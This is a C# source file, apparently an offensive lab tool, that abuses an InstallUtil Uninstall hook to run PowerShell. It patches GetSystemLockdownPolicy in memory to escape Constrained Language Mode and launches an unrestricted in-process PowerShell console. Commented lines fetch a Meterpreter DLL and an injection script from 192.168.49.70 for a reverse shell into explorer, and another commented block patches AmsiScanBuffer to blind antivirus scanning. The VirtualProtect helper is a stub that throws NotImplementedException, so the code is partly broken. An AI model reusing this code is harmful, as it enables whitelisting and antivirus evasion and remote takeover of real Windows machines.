using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Bypass
{
	class Program
	{
		// This method must be presents in an application but doesn't important
		static void Main(string[] args)
		{
			Console.WriteLine("Nothing to see here");
		}
    }
	
	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			// Create a custom runspace
			Runspace rs = RunspaceFactory.CreateRunspace();
			// Calling the Open method so we can interact with it
			rs.Open();

			// Instantiate a new PowerShell object and assign it our newly created runspace
			PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;

			/* the string command commands below are few samples what we can do */
            
			// 1. Check the language mode when using InstallUtil
            string command = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath poc.txt";


            // 2. A Reverse Shell using DLL reflective load with the help of Invoke-ReflectivePEInjection.ps1 to bypass DLL AppLocker Roles
            //string command = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.70/met_x64.dll');" // Load Meterpreter DLL as a bytearray to a variable
            //	+ "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.70/Invoke-ReflectivePEInjection.ps1') | IEX;" // Load the PowerShell script
            //	+ "Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId (Get-Process -Name explorer).Id"; // Invoke the script and inject to explorer the shellcode

			// 3. Enter into a PowerShell session (works with CLI no GUI needed)


            // Add the command to the pipline, execute it and close the current runspace
            ps.AddScript(command);
			ps.Invoke();
			rs.Close();
            go();
		}
        public static void go()
        {
            // Find a reference to the automation assembly
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            // Get a MethodInfo reference to the GetSystemLockdownPolicy method
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            // Retrieve a handle to the method
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            // This ensures the method is JIT compiled
            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            // Get a pointer to the compiled function
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            // Ensure we can write to the address
            VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            // Write the instructions "mov rax, 0; ret". This returns 0, which is the same as returning SystemEnforcementMode.None
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);

            /* AMSI Bypass commented out */
            // Before we start powershell, we nullify AmsiScanBuffer as well. This ensures AMSI doesn't plague
            // us in our new shell.
            //var amsi = LoadLibrary("amsi.dll");
            //var AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
            //VirtualProtect(AmsiScanBuffer, new UIntPtr(8), 0x40, out lpflOldProtect);

            // Stolen from https://github.com/rasta-mouse/AmsiScanBufferBypass
            // On x86, Windows uses __stdcall, which is callee cleanup, whereas 64-bit uses Microsoft x64 calling convention
            // which is caller cleanup. If we don't use the right one, we will get a stack alignment error.
            //if (System.IntPtr.Size == 8)
            //{
            //    // mov eax,E_INVALIDARG
            //    // ret
            //    Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, AmsiScanBuffer, 6);
            //}
            //else
            //{
            //    // mov eax,E_INVALIDARG
            //    // ret 18
            //    Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, AmsiScanBuffer, 8);
            //}

            // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] {
                "-exec", "bypass", "-nop"});
        }

        private static void VirtualProtect(IntPtr get_lockdown_ptr, UIntPtr uIntPtr, int v, out uint lpflOldProtect)
        {
            throw new NotImplementedException();
        }
    }
}